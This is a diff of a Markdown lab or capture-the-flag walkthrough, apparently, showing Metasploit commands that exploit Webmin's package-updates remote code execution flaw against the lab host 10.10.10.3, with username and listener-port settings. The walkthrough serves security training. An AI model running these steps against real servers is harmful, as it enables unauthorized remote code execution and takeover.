@@ -325,7 +325,7 @@ We perform a search and find that this service is vulnerable to Package Updates 
 
 ```python
 searched for exploits related to Webmin. 
-``
+
 search webmin 
 I found an exploit that works very well. 
 
@@ -337,6 +337,17 @@ msf6 exploit(linux/http/webmin_packageup_rce) > set USERNAME support msf6 exploi
 msf6 exploit(linux/http/webmin_packageup_rce) > set rhost 10.10.10.3 msf6 exploit(linux/http/webmin_packageup_rce) > set lport 4442
 ```
 
+```pyhton
+search webmin
+```
+
+```python
+use exploit/linux/http/webmin_packageup_rce
+```
+
+```python
+
+```
 
 
 ![[Pasted image 20250513135727.png]]
